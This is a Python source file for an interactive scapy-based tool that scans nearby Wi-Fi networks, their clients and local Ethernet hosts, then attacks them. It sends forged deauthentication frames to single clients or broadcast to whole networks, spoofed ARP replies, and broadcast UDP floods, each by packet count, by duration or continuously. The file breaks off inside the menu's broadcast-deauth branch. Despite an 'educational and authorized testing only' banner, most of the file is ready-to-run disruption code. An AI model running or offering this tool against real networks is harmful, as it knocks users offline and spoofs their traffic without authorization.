#!/usr/bin/env python3

import os
import sys
import time
import subprocess
import threading
import signal
from datetime import datetime
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap, Dot11Elt
from scapy.layers.l2 import Ether, ARP
import argparse
import json
import re
from typing import List, Dict, Optional, Tuple, Set
import csv
import netifaces

# Global variables
selected_interfaces = {"wlan": "wlan0", "eth": "eth0"}  # Default interfaces
selected_network = None
selected_client = None
scan_results = []
clients_list = []
running = True
log_file = "wifi_deauth_log.csv"
attack_threads = []

class Logger:
    def __init__(self, log_file: str = "wifi_deauth_log.csv"):
        self.log_file = log_file
        self.ensure_log_file()
    
    def ensure_log_file(self):
        """Create log file with headers if it doesn't exist"""
        if not os.path.exists(self.log_file):
            with open(self.log_file, 'w', newline='') as f:
                writer = csv.writer(f)
                writer.writerow(['Timestamp', 'Action', 'Interface_Type', 'Interface_Name', 
                               'BSSID', 'ESSID', 'Client_MAC', 'Channel', 
                               'Duration', 'Packets_Sent', 'Status'])
    
    def log(self, action: str, interface_type: str = "", interface_name: str = "", 
            bssid: str = "", essid: str = "", client_mac: str = "", 
            channel: str = "", duration: str = "", packets: str = "", status: str = ""):
        """Log an action to the CSV file"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        with open(self.log_file, 'a', newline='') as f:
            writer = csv.writer(f)
            writer.writerow([timestamp, action, interface_type, interface_name, 
                           bssid, essid, client_mac, channel, duration, packets, status])
        
        print(f"[LOG] {timestamp} - {action}: {status}")

logger = Logger(log_file)

def check_root():
    """Check if script is running as root"""
    if os.geteuid() != 0:
        print("This script requires root privileges!")
        print("Please run with sudo.")
        sys.exit(1)

def get_available_interfaces() -> Dict[str, List[str]]:
    """Get all available network interfaces categorized by type"""
    interfaces = {"wlan": [], "eth": []}
    
    try:
        # Get all interfaces
        all_interfaces = netifaces.interfaces()
        
        for iface in all_interfaces:
            # Skip loopback and virtual interfaces
            if iface.startswith('lo') or iface.startswith('docker') or iface.startswith('veth'):
                continue
            
            # Check if it's wireless
            if os.path.exists(f'/sys/class/net/{iface}/wireless'):
                interfaces["wlan"].append(iface)
            # Check if it's ethernet (or likely ethernet)
            elif 'eth' in iface or 'enp' in iface or 'ens' in iface or 'eno' in iface:
                interfaces["eth"].append(iface)
        
        return interfaces
    except:
        # Fallback method
        try:
            result = subprocess.run(['ip', 'link', 'show'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'wlan' in line:
                    match = re.search(r'^\d+: (\w+):', line)
                    if match:
                        interfaces["wlan"].append(match.group(1))
                elif 'eth' in line or 'enp' in line:
                    match = re.search(r'^\d+: (\w+):', line)
                    if match:
                        interfaces["eth"].append(match.group(1))
        except:
            pass
        
        return interfaces

def check_interface(interface: str, interface_type: str) -> bool:
    """Check if interface exists and is in appropriate mode"""
    try:
        if interface_type == "wlan":
            result = subprocess.run(['iwconfig', interface], 
                                  capture_output=True, text=True)
            if interface in result.stdout and "Mode:Monitor" in result.stdout:
                return True
        elif interface_type == "eth":
            result = subprocess.run(['ip', 'link', 'show', interface], 
                                  capture_output=True, text=True)
            if interface in result.stdout:
                return True
        return False
    except:
        return False

def set_monitor_mode(interface: str) -> bool:
    """Set wireless interface to monitor mode"""
    try:
        print(f"Setting {interface} to monitor mode...")
        
        # Kill interfering processes
        subprocess.run(['airmon-ng', 'check', 'kill'], 
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Use airmon-ng to set monitor mode
        result = subprocess.run(['airmon-ng', 'start', interface], 
                              capture_output=True, text=True)
        
        if "monitor mode enabled" in result.stdout.lower():
            # Find the new monitor interface name
            for line in result.stdout.split('\n'):
                if 'monitor mode enabled on' in line.lower():
                    match = re.search(r'enabled on (\w+)', line, re.IGNORECASE)
                    if match:
                        new_iface = match.group(1)
                        if new_iface != interface:
                            print(f"Interface renamed to: {new_iface}")
                            return new_iface
            return interface
        else:
            # Try manual method
            subprocess.run(['ip', 'link', 'set', interface, 'down'], check=True)
            subprocess.run(['iwconfig', interface, 'mode', 'monitor'], check=True)
            subprocess.run(['ip', 'link', 'set', interface, 'up'], check=True)
            return interface
            
    except Exception as e:
        print(f"Error setting monitor mode: {e}")
        return None

def scan_arp_network(interface: str) -> List[Dict]:
    """Scan local network for devices using ARP"""
    print(f"Scanning local network on {interface}...")
    
    devices = []
    local_ip = None
    
    try:
        # Get local IP and network
        addrs = netifaces.ifaddresses(interface)
        if netifaces.AF_INET in addrs:
            local_ip = addrs[netifaces.AF_INET][0]['addr']
            netmask = addrs[netifaces.AF_INET][0]['netmask']
            
            # Calculate network range
            ip_parts = list(map(int, local_ip.split('.')))
            mask_parts = list(map(int, netmask.split('.')))
            
            network_parts = []
            for i in range(4):
                network_parts.append(ip_parts[i] & mask_parts[i])
            
            network_ip = '.'.join(map(str, network_parts))
            
            print(f"Scanning network: {network_ip}/24")
            
            # Create ARP request for the network
            arp = ARP(pdst=f"{network_ip}/24")
            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = ether/arp
            
            # Send and receive packets
            result = srp(packet, timeout=3, iface=interface, verbose=0)[0]
            
            for sent, received in result:
                devices.append({
                    'MAC': received.hwsrc,
                    'IP': received.psrc,
                    'Type': 'Ethernet',
                    'Interface': interface
                })
                
    except Exception as e:
        print(f"Error scanning ARP network: {e}")
    
    return devices

def scan_networks(interface: str) -> List[Dict]:
    """Scan for nearby Wi-Fi networks"""
    print(f"Scanning for Wi-Fi networks on {interface}...")
    
    networks = []
    
    # First check if airodump-ng is available
    airodump_available = subprocess.run(['which', 'airodump-ng'], 
                                       capture_output=True).returncode == 0
    
    if airodump_available:
        try:
            # Use airodump-ng for better results
            temp_file = f"/tmp/scan_{int(time.time())}"
            cmd = ['airodump-ng', '--output-format', 'csv', '--write', temp_file, interface]
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Let it scan for 8 seconds
            time.sleep(8)
            process.send_signal(signal.SIGINT)
            process.wait()
            
            # Read the CSV file
            csv_file = f"{temp_file}-01.csv"
            if os.path.exists(csv_file):
                with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                    lines = f.readlines()
                
                # Find where networks start
                for i, line in enumerate(lines):
                    if line.startswith('BSSID,'):
                        network_lines = lines[i+1:]
                        break
                    else:
                        network_lines = []
                
                for line in network_lines:
                    if line.strip() and not line.startswith('Station MAC,'):
                        parts = line.split(',')
                        if len(parts) >= 14:
                            bssid = parts[0].strip()
                            channel = parts[3].strip()
                            essid = parts[13].strip()
                            
                            if bssid and channel:
                                networks.append({
                                    'BSSID': bssid,
                                    'Channel': channel,
                                    'ESSID': essid if essid else '<hidden>',
                                    'Interface': interface
                                })
                
                # Clean up
                for f in [csv_file, temp_file + '-01.kismet.csv', temp_file + '-01.cap']:
                    if os.path.exists(f):
                        os.remove(f)
            
        except Exception as e:
            print(f"Airodump-ng scan failed: {e}")
            print("Falling back to scapy scan...")
            networks = scan_with_scapy(interface)
    else:
        print("Airodump-ng not found, using scapy...")
        networks = scan_with_scapy(interface)
    
    return networks

def scan_with_scapy(interface: str) -> List[Dict]:
    """Alternative scan using scapy"""
    networks = []
    seen_bssids = set()
    
    def packet_handler(pkt):
        if pkt.haslayer(Dot11Beacon):
            bssid = pkt[Dot11].addr2
            
            if bssid in seen_bssids:
                return
            
            seen_bssids.add(bssid)
            
            # Extract ESSID
            essid = None
            if pkt.haslayer(Dot11Elt):
                elt = pkt[Dot11Elt]
                while isinstance(elt, Dot11Elt):
                    if elt.ID == 0:  # ESSID
                        try:
                            essid = elt.info.decode('utf-8', errors='ignore')
                        except:
                            essid = "<hidden>"
                        break
                    elt = elt.payload
            
            # Extract channel
            channel = None
            if pkt.haslayer(Dot11Elt):
                elt = pkt[Dot11Elt]
                while isinstance(elt, Dot11Elt):
                    if elt.ID == 3:  # DS Parameter Set
                        channel = str(elt.info[0])
                        break
                    elt = elt.payload
            
            if bssid:
                networks.append({
                    'BSSID': bssid,
                    'ESSID': essid or '<hidden>',
                    'Channel': channel or 'Unknown',
                    'Interface': interface
                })
    
    print("Scanning with scapy (10 seconds)...")
    try:
        sniff(iface=interface, prn=packet_handler, timeout=10)
    except Exception as e:
        print(f"Scapy scan error: {e}")
    
    return networks

def select_network(interface: str, bssid: str, channel: str) -> List[Dict]:
    """Select a network and scan for connected clients"""
    print(f"Scanning for clients on network {bssid} on channel {channel}...")
    
    clients = []
    
    try:
        # Set channel
        subprocess.run(['iwconfig', interface, 'channel', channel], 
                      capture_output=True, stderr=subprocess.DEVNULL)
        
        # Use airodump-ng to scan for clients
        temp_file = f"/tmp/client_scan_{int(time.time())}"
        cmd = ['airodump-ng', '--bssid', bssid, '--channel', channel,
               '--output-format', 'csv', '--write', temp_file, '--write-interval', '1']
        
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Let it scan for 10 seconds
        time.sleep(10)
        process.send_signal(signal.SIGINT)
        process.wait()
        
        # Read the CSV file
        csv_file = f"{temp_file}-01.csv"
        if os.path.exists(csv_file):
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
            
            # Find where clients start
            client_start = False
            for line in lines:
                if line.startswith('Station MAC,'):
                    client_start = True
                    continue
                
                if client_start and line.strip():
                    parts = line.split(',')
                    if len(parts) >= 1:
                        client_mac = parts[0].strip()
                        if client_mac and client_mac != 'BSSID':
                            clients.append({
                                'MAC': client_mac,
                                'BSSID': bssid,
                                'Interface': interface,
                                'Type': 'Wi-Fi'
                            })
            
            # Clean up
            for f in [csv_file, temp_file + '-01.kismet.csv', temp_file + '-01.cap']:
                if os.path.exists(f):
                    os.remove(f)
                    
    except Exception as e:
        print(f"Error scanning clients: {e}")
    
    return clients

def deauth_client(interface: str, interface_type: str, bssid: str, 
                  client_mac: str, count: int = 0, duration: int = 0) -> threading.Thread:
    """Deauthenticate a specific client"""
    def deauth_thread():
        nonlocal interface, interface_type, bssid, client_mac
        
        packets_sent = 0
        start_time = time.time()
        
        if interface_type == "wlan":
            # Wi-Fi deauthentication
            packet1 = RadioTap() / \
                     Dot11(addr1=client_mac, addr2=bssid, addr3=bssid) / \
                     Dot11Deauth(reason=7)
            
            packet2 = RadioTap() / \
                     Dot11(addr1=bssid, addr2=client_mac, addr3=bssid) / \
                     Dot11Deauth(reason=7)
            
            try:
                if duration > 0:
                    while (time.time() - start_time) < duration and running:
                        sendp(packet1, iface=interface, count=1, verbose=0)
                        sendp(packet2, iface=interface, count=1, verbose=0)
                        packets_sent += 2
                        time.sleep(0.1)
                elif count > 0:
                    for _ in range(count):
                        if not running:
                            break
                        sendp(packet1, iface=interface, count=1, verbose=0)
                        sendp(packet2, iface=interface, count=1, verbose=0)
                        packets_sent += 2
                        time.sleep(0.1)
                else:
                    while running:
                        sendp(packet1, iface=interface, count=1, verbose=0)
                        sendp(packet2, iface=interface, count=1, verbose=0)
                        packets_sent += 2
                        time.sleep(0.1)
                
                print(f"[Wi-Fi] Deauth completed. Packets sent: {packets_sent}")
                logger.log("Deauth_Client", "Wi-Fi", interface, bssid, "", client_mac, 
                          "", f"{duration}s" if duration > 0 else f"{count}pkts", 
                          str(packets_sent), "Completed")
                
            except Exception as e:
                print(f"[Wi-Fi] Deauth error: {e}")
                logger.log("Deauth_Client", "Wi-Fi", interface, bssid, "", client_mac,
                          "", f"{duration}s" if duration > 0 else f"{count}pkts", 
                          str(packets_sent), f"Error: {e}")
        
        elif interface_type == "eth":
            # Ethernet ARP spoofing/disruption
            try:
                # Create fake ARP responses
                arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / \
                            ARP(op=2, pdst="192.168.1.1", hwdst="ff:ff:ff:ff:ff:ff",
                                psrc="192.168.1.100", hwsrc=client_mac)
                
                if duration > 0:
                    while (time.time() - start_time) < duration and running:
                        sendp(arp_packet, iface=interface, count=10, verbose=0)
                        packets_sent += 10
                        time.sleep(1)
                elif count > 0:
                    for _ in range(count // 10):
                        if not running:
                            break
                        sendp(arp_packet, iface=interface, count=10, verbose=0)
                        packets_sent += 10
                        time.sleep(1)
                else:
                    while running:
                        sendp(arp_packet, iface=interface, count=10, verbose=0)
                        packets_sent += 10
                        time.sleep(1)
                
                print(f"[Ethernet] ARP disruption completed. Packets sent: {packets_sent}")
                logger.log("ARP_Disruption", "Ethernet", interface, "", "", client_mac,
                          "", f"{duration}s" if duration > 0 else f"{count}pkts",
                          str(packets_sent), "Completed")
                
            except Exception as e:
                print(f"[Ethernet] ARP disruption error: {e}")
                logger.log("ARP_Disruption", "Ethernet", interface, "", "", client_mac,
                          "", f"{duration}s" if duration > 0 else f"{count}pkts",
                          str(packets_sent), f"Error: {e}")
    
    thread = threading.Thread(target=deauth_thread)
    thread.daemon = True
    thread.start()
    attack_threads.append(thread)
    return thread

def deauth_all(interface: str, interface_type: str, bssid: str = "", 
               channel: str = "", count: int = 0, duration: int = 0) -> threading.Thread:
    """Deauthenticate all clients from a network"""
    def broadcast_deauth_thread():
        nonlocal interface, interface_type, bssid, channel
        
        packets_sent = 0
        start_time = time.time()
        
        if interface_type == "wlan" and bssid and channel:
            # Wi-Fi broadcast deauth
            packet = RadioTap() / \
                    Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) / \
                    Dot11Deauth(reason=7)
            
            try:
                # Set channel
                subprocess.run(['iwconfig', interface, 'channel', channel], 
                              capture_output=True, stderr=subprocess.DEVNULL)
                
                if duration > 0:
                    while (time.time() - start_time) < duration and running:
                        sendp(packet, iface=interface, count=1, verbose=0)
                        packets_sent += 1
                        time.sleep(0.1)
                elif count > 0:
                    for _ in range(count):
                        if not running:
                            break
                        sendp(packet, iface=interface, count=1, verbose=0)
                        packets_sent += 1
                        time.sleep(0.1)
                else:
                    while running:
                        sendp(packet, iface=interface, count=1, verbose=0)
                        packets_sent += 1
                        time.sleep(0.1)
                
                print(f"[Wi-Fi] Broadcast deauth completed. Packets sent: {packets_sent}")
                logger.log("Deauth_All", "Wi-Fi", interface, bssid, "", "", channel,
                          f"{duration}s" if duration > 0 else f"{count}pkts",
                          str(packets_sent), "Completed")
                
            except Exception as e:
                print(f"[Wi-Fi] Broadcast deauth error: {e}")
                logger.log("Deauth_All", "Wi-Fi", interface, bssid, "", "", channel,
                          f"{duration}s" if duration > 0 else f"{count}pkts",
                          str(packets_sent), f"Error: {e}")
        
        elif interface_type == "eth":
            # Ethernet broadcast storm (limited)
            try:
                # Create broadcast packet
                broadcast_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / \
                                 IP(dst="255.255.255.255") / \
                                 UDP(dport=9) / b'X' * 100
                
                if duration > 0:
                    while (time.time() - start_time) < duration and running:
                        sendp(broadcast_packet, iface=interface, count=10, verbose=0)
                        packets_sent += 10
                        time.sleep(0.5)
                elif count > 0:
                    for _ in range(count // 10):
                        if not running:
                            break
                        sendp(broadcast_packet, iface=interface, count=10, verbose=0)
                        packets_sent += 10
                        time.sleep(0.5)
                else:
                    while running:
                        sendp(broadcast_packet, iface=interface, count=10, verbose=0)
                        packets_sent += 10
                        time.sleep(0.5)
                
                print(f"[Ethernet] Broadcast disruption completed. Packets sent: {packets_sent}")
                logger.log("Broadcast_Disruption", "Ethernet", interface, "", "", "", "",
                          f"{duration}s" if duration > 0 else f"{count}pkts",
                          str(packets_sent), "Completed")
                
            except Exception as e:
                print(f"[Ethernet] Broadcast disruption error: {e}")
                logger.log("Broadcast_Disruption", "Ethernet", interface, "", "", "", "",
                          f"{duration}s" if duration > 0 else f"{count}pkts",
                          str(packets_sent), f"Error: {e}")
    
    thread = threading.Thread(target=broadcast_deauth_thread)
    thread.daemon = True
    thread.start()
    attack_threads.append(thread)
    return thread

def display_networks(networks: List[Dict], interface_type: str = "Wi-Fi"):
    """Display networks in a formatted table"""
    print(f"\n{interface_type} Networks Found:")
    print("="*90)
    print(f"{'#':<3} {'BSSID':<20} {'Channel':<10} {'ESSID':<30} {'Interface':<15}")
    print("="*90)
    
    for i, network in enumerate(networks, 1):
        bssid = network.get('BSSID', network.get('MAC', 'N/A'))
        channel = network.get('Channel', network.get('IP', 'N/A'))
        essid = network.get('ESSID', network.get('Type', 'Device'))
        interface = network.get('Interface', 'Unknown')
        
        print(f"{i:<3} {bssid:<20} {channel:<10} {str(essid)[:30]:<30} {interface:<15}")
    print("="*90)

def display_clients(clients: List[Dict]):
    """Display clients in a formatted table"""
    print("\n" + "="*70)
    print(f"{'#':<3} {'Client MAC':<20} {'IP':<15} {'Type':<10} {'Interface':<15}")
    print("="*70)
    
    for i, client in enumerate(clients, 1):
        mac = client.get('MAC', 'N/A')
        ip = client.get('IP', 'N/A')
        client_type = client.get('Type', 'Unknown')
        interface = client.get('Interface', 'Unknown')
        
        print(f"{i:<3} {mac:<20} {ip:<15} {client_type:<10} {interface:<15}")
    print("="*70)

def check_adapter_status():
    """Check network adapter status"""
    print("\nNetwork Adapter Status:")
    print("="*80)
    
    interfaces = get_available_interfaces()
    
    for iface_type, iface_list in interfaces.items():
        print(f"\n{iface_type.upper()} Interfaces:")
        print("-" * 40)
        
        for iface in iface_list:
            print(f"\n  Interface: {iface}")
            
            try:
                # Get MAC address
                with open(f'/sys/class/net/{iface}/address', 'r') as f:
                    mac = f.read().strip()
                    print(f"  MAC Address: {mac}")
                
                # Get operational state
                with open(f'/sys/class/net/{iface}/operstate', 'r') as f:
                    state = f.read().strip()
                    print(f"  State: {state}")
                
                # Get IP address
                addrs = netifaces.ifaddresses(iface)
                if netifaces.AF_INET in addrs:
                    ip = addrs[netifaces.AF_INET][0]['addr']
                    print(f"  IP Address: {ip}")
                
                # For Wi-Fi, get mode and channel
                if iface_type == "wlan":
                    result = subprocess.run(['iwconfig', iface], 
                                          capture_output=True, text=True)
                    
                    mode_match = re.search(r'Mode:(\S+)', result.stdout)
                    if mode_match:
                        print(f"  Mode: {mode_match.group(1)}")
                    
                    channel_match = re.search(r'Channel (\d+)', result.stdout)
                    if channel_match:
                        print(f"  Channel: {channel_match.group(1)}")
                
                # Check if monitor mode is possible
                if iface_type == "wlan":
                    result = subprocess.run(['iw', 'list'], 
                                          capture_output=True, text=True)
                    if "monitor" in result.stdout.lower():
                        print(f"  Monitor Mode: Supported")
                    else:
                        print(f"  Monitor Mode: Not Supported")
                        
            except Exception as e:
                print(f"  Error reading info: {e}")
    
    logger.log("Check_Adapters", "All", "Multiple", status="Completed")

def configure_interface(interface_type: str):
    """Configure a network interface"""
    interfaces = get_available_interfaces()
    
    if interface_type not in interfaces or not interfaces[interface_type]:
        print(f"No {interface_type} interfaces found!")
        return None
    
    print(f"\nAvailable {interface_type} interfaces:")
    for i, iface in enumerate(interfaces[interface_type], 1):
        print(f"{i}. {iface}")
    
    try:
        choice = int(input(f"\nSelect interface (1-{len(interfaces[interface_type])}): "))
        if 1 <= choice <= len(interfaces[interface_type]):
            selected_iface = interfaces[interface_type][choice-1]
            
            if interface_type == "wlan":
                # Check and set monitor mode
                if not check_interface(selected_iface, "wlan"):
                    print(f"{selected_iface} is not in monitor mode.")
                    set_choice = input("Set to monitor mode? (y/n): ").lower()
                    if set_choice == 'y':
                        new_iface = set_monitor_mode(selected_iface)
                        if new_iface:
                            selected_iface = new_iface
                            print(f"Interface ready: {selected_iface}")
                        else:
                            print("Failed to set monitor mode!")
                            return None
                    else:
                        return None
            
            print(f"Selected {interface_type} interface: {selected_iface}")
            return selected_iface
        else:
            print("Invalid selection!")
            return None
    except ValueError:
        print("Please enter a valid number!")
        return None

def stop_all_attacks():
    """Stop all running attacks"""
    global running, attack_threads
    running = False
    print("\nStopping all attacks...")
    
    # Wait for threads to finish
    for thread in attack_threads:
        if thread.is_alive():
            thread.join(timeout=2)
    
    attack_threads = []
    running = True  # Reset for next attacks
    print("All attacks stopped.")

def view_logs():
    """View log file contents"""
    if os.path.exists(log_file):
        print(f"\nLog file: {log_file}")
        print("="*120)
        
        with open(log_file, 'r') as f:
            reader = csv.reader(f)
            rows = list(reader)
            
            if rows:
                # Display header
                headers = rows[0]
                print(f"{headers[0]:<20} {headers[1]:<15} {headers[2]:<10} {headers[3]:<12} "
                      f"{headers[4]:<18} {headers[5]:<20} {headers[6]:<18} {headers[8]:<10} {headers[10]:<30}")
                print("-"*120)
                
                # Display data rows
                for row in rows[1:]:
                    if len(row) >= 11:
                        print(f"{row[0]:<20} {row[1]:<15} {row[2]:<10} {row[3]:<12} "
                              f"{row[4]:<18} {row[5][:20]:<20} {row[6]:<18} {row[8]:<10} {row[10][:30]:<30}")
        
        print("="*120)
        
        # Show statistics
        print(f"\nTotal entries: {len(rows)-1}")
        
        # Count by action type
        if len(rows) > 1:
            actions = {}
            for row in rows[1:]:
                if len(row) > 1:
                    action = row[1]
                    actions[action] = actions.get(action, 0) + 1
            
            print("\nActions summary:")
            for action, count in actions.items():
                print(f"  {action}: {count}")
    else:
        print("Log file not found!")

def main():
    global selected_network, selected_client, scan_results, clients_list, running
    global selected_interfaces
    
    check_root()
    
    print("="*70)
    print("NETWORK DEAUTHENTICATION TOOL")
    print("Wi-Fi + Ethernet Support")
    print("For educational and authorized testing only!")
    print("="*70)
    
    # Display available interfaces
    interfaces = get_available_interfaces()
    print("\nDetected Interfaces:")
    for iface_type, iface_list in interfaces.items():
        print(f"  {iface_type.upper()}: {', '.join(iface_list) if iface_list else 'None'}")
    print("="*70)
    
    while True:
        print("\n" + "="*70)
        print("MAIN MENU")
        print("="*70)
        print("1. Scan for Wi-Fi networks")
        print("2. Scan for Ethernet devices (ARP scan)")
        print("3. Select a Wi-Fi network for further actions")
        print("4. Deauthenticate a client (Wi-Fi or Ethernet)")
        print("5. Deauthenticate all clients (Wi-Fi or Ethernet)")
        print("6. Configure Interfaces")
        print("7. Check Network Adapter Status")
        print("8. View Log File")
        print("9. Stop All Running Attacks")
        print("10. Exit")
        print("="*70)
        
        choice = input("Select an option (1-10): ").strip()
        
        if choice == '1':
            # Scan for Wi-Fi networks
            if "wlan" not in selected_interfaces or not selected_interfaces["wlan"]:
                print("No Wi-Fi interface configured!")
                print("Please configure Wi-Fi interface in Option 6 first.")
                continue
            
            scan_results = scan_networks(selected_interfaces["wlan"])
            
            if scan_results:
                display_networks(scan_results, "Wi-Fi")
                logger.log("Wi-Fi_Scan", "Wi-Fi", selected_interfaces["wlan"], 
                          status=f"Found {len(scan_results)} networks")
                
                # Option to save scan results
                save_choice = input("\nSave scan results to file? (y/n): ").lower()
                if save_choice == 'y':
                    filename = f"wifi_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                    with open(filename, 'w') as f:
                        f.write("BSSID,Channel,ESSID,Interface\n")
                        for network in scan_results:
                            f.write(f"{network['BSSID']},{network['Channel']},{network['ESSID']},{network['Interface']}\n")
                    print(f"Scan results saved to {filename}")
            else:
                print("No Wi-Fi networks found!")
                logger.log("Wi-Fi_Scan", "Wi-Fi", selected_interfaces["wlan"], 
                          status="No networks found")
        
        elif choice == '2':
            # Scan for Ethernet devices
            if "eth" not in selected_interfaces or not selected_interfaces["eth"]:
                print("No Ethernet interface configured!")
                print("Please configure Ethernet interface in Option 6 first.")
                continue
            
            scan_results = scan_arp_network(selected_interfaces["eth"])
            
            if scan_results:
                display_networks(scan_results, "Ethernet")
                logger.log("Ethernet_Scan", "Ethernet", selected_interfaces["eth"], 
                          status=f"Found {len(scan_results)} devices")
                
                # Option to save scan results
                save_choice = input("\nSave scan results to file? (y/n): ").lower()
                if save_choice == 'y':
                    filename = f"ethernet_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                    with open(filename, 'w') as f:
                        f.write("MAC,IP,Type,Interface\n")
                        for device in scan_results:
                            f.write(f"{device['MAC']},{device['IP']},{device['Type']},{device['Interface']}\n")
                    print(f"Scan results saved to {filename}")
            else:
                print("No Ethernet devices found!")
                logger.log("Ethernet_Scan", "Ethernet", selected_interfaces["eth"], 
                          status="No devices found")
        
        elif choice == '3':
            # Select a Wi-Fi network
            if not scan_results or not any('BSSID' in net for net in scan_results):
                print("Please scan for Wi-Fi networks first (Option 1)!")
                continue
            
            # Filter only Wi-Fi networks
            wifi_networks = [net for net in scan_results if 'BSSID' in net]
            if not wifi_networks:
                print("No Wi-Fi networks in scan results!")
                continue
            
            display_networks(wifi_networks, "Wi-Fi")
            
            try:
                net_choice = int(input(f"\nSelect network (1-{len(wifi_networks)}): "))
                if 1 <= net_choice <= len(wifi_networks):
                    selected_network = wifi_networks[net_choice-1]
                    print(f"\nSelected Network:")
                    print(f"BSSID: {selected_network['BSSID']}")
                    print(f"Channel: {selected_network['Channel']}")
                    print(f"ESSID: {selected_network['ESSID']}")
                    print(f"Interface: {selected_network['Interface']}")
                    
                    # Scan for clients on this network
                    clients_list = select_network(selected_network['Interface'], 
                                                 selected_network['BSSID'],
                                                 selected_network['Channel'])
                    
                    if clients_list:
                        display_clients(clients_list)
                        logger.log("Client_Scan", "Wi-Fi", selected_network['Interface'],
                                 selected_network['BSSID'], selected_network['ESSID'],
                                 status=f"Found {len(clients_list)} clients")
                    else:
                        print("No clients found on this network!")
                        logger.log("Client_Scan", "Wi-Fi", selected_network['Interface'],
                                 selected_network['BSSID'], selected_network['ESSID'],
                                 status="No clients found")
                else:
                    print("Invalid selection!")
            except ValueError:
                print("Please enter a valid number!")
        
        elif choice == '4':
            # Deauthenticate a specific client
            print("\nSelect attack type:")
            print("1. Wi-Fi client deauthentication")
            print("2. Ethernet ARP disruption")
            
            attack_type = input("Select (1-2): ").strip()
            
            if attack_type == '1':
                # Wi-Fi deauth
                if not selected_network:
                    print("Please select a Wi-Fi network first (Option 3)!")
                    continue
                
                if not clients_list:
                    print("No clients found on this network!")
                    continue
                
                display_clients(clients_list)
                
                try:
                    client_choice = int(input(f"\nSelect client to deauth (1-{len(clients_list)}): "))
                    if 1 <= client_choice <= len(clients_list):
                        selected_client = clients_list[client_choice-1]
                        
                        print(f"\nSelected Client:")
                        print(f"MAC: {selected_client['MAC']}")
                        print(f"Network: {selected_network['ESSID']} ({selected_network['BSSID']})")
                        
                        print("\nDeauth Options:")
                        print("1. Send specific number of packets")
                        print("2. Send for specific duration (seconds)")
                        print("3. Continuous (until stopped)")
                        
                        deauth_choice = input("Select option (1-3): ").strip()
                        
                        if deauth_choice == '1':
                            count = int(input("Number of packets to send (each direction): "))
                            print(f"\nStarting deauth attack on {selected_client['MAC']}...")
                            print("Use Option 9 to stop the attack")
                            deauth_client(selected_network['Interface'], "wlan",
                                         selected_network['BSSID'], selected_client['MAC'], 
                                         count=count)
                            
                        elif deauth_choice == '2':
                            duration = int(input("Duration in seconds: "))
                            print(f"\nStarting deauth attack on {selected_client['MAC']} for {duration} seconds...")
                            deauth_client(selected_network['Interface'], "wlan",
                                         selected_network['BSSID'], selected_client['MAC'], 
                                         duration=duration)
                            
                        elif deauth_choice == '3':
                            print(f"\nStarting continuous deauth attack on {selected_client['MAC']}...")
                            print("Use Option 9 to stop the attack")
                            deauth_client(selected_network['Interface'], "wlan",
                                         selected_network['BSSID'], selected_client['MAC'])
                            
                        else:
                            print("Invalid choice!")
                            
                    else:
                        print("Invalid selection!")
                except ValueError:
                    print("Please enter a valid number!")
            
            elif attack_type == '2':
                # Ethernet ARP disruption
                if "eth" not in selected_interfaces or not selected_interfaces["eth"]:
                    print("No Ethernet interface configured!")
                    continue
                
                # Get target MAC
                target_mac = input("Enter target MAC address (or leave blank for broadcast): ").strip()
                
                if not target_mac:
                    target_mac = "ff:ff:ff:ff:ff:ff"
                
                print("\nAttack Options:")
                print("1. Send specific number of packets")
                print("2. Send for specific duration (seconds)")
                print("3. Continuous (until stopped)")
                
                attack_choice = input("Select option (1-3): ").strip()
                
                if attack_choice == '1':
                    count = int(input("Number of packets to send: "))
                    print(f"\nStarting ARP disruption on {target_mac}...")
                    print("Use Option 9 to stop the attack")
                    deauth_client(selected_interfaces["eth"], "eth", "", 
                                 target_mac, count=count)
                    
                elif attack_choice == '2':
                    duration = int(input("Duration in seconds: "))
                    print(f"\nStarting ARP disruption for {duration} seconds...")
                    deauth_client(selected_interfaces["eth"], "eth", "", 
                                 target_mac, duration=duration)
                    
                elif attack_choice == '3':
                    print(f"\nStarting continuous ARP disruption...")
                    print("Use Option 9 to stop the attack")
                    deauth_client(selected_interfaces["eth"], "eth", "", 
                                 target_mac)
                    
                else:
                    print("Invalid choice!")
            
            else:
                print("Invalid selection!")
        
        elif choice == '5':
            # Deauthenticate all clients
            print("\nSelect attack type:")
            print("1. Wi-Fi broadcast deauth")
            print("2. Ethernet broadcast disruption")
            
            attack_type = input("Select (1-2): ").strip()
            
            if attack_type == '1':
                # Wi-Fi broadcast deauth
                if not selected_network:
                    print("Please select a Wi-Fi network first (Option 3)!")
                    continue
                
                print(f"\nNetwork: {selected_network['ESSID']} ({selected_network['BSSID']})")
                print(f"Channel: {selected_network['Channel']}")
                print(f"Interface: {selected_network['Interface']}")
                
                print("\nDeauth Options:")
                print("1. Send specific number of packets")
                print("2. Send for specific duration (seconds)")
                print("3. Continuous (until stopped)")
                
                deauth_choice = input("Select option (1-3): ").strip()
                
                if deauth_choice == '1':
                    count = int(input("Number of packets to send: "))
                    print(f"\nStarting broadcast deauth attack...")
                    print("Use Option 9 to stop the attack")
                    deauth_all(selected_network['Interface'], "wlan",
                              selected_network['BSSID'], selected_network['Channel'],
                              count=count)
                    
                elif deauth_choice == '2':
                    duration = int(input("Duration in seconds: "))
                    print(f"\nStarting broadcast deauth for {duration} seconds...")
                    deauth_all(selected_network['Interface'], "wlan",
                              selected_network['BSSID'], selected_network['Channel'],
                              duration=duration)
                    
                elif deauth_choice == '3':
                    print(f"\nStarting continuous broadcast deauth...")
                    print("Use Option 9 to stop the attack")
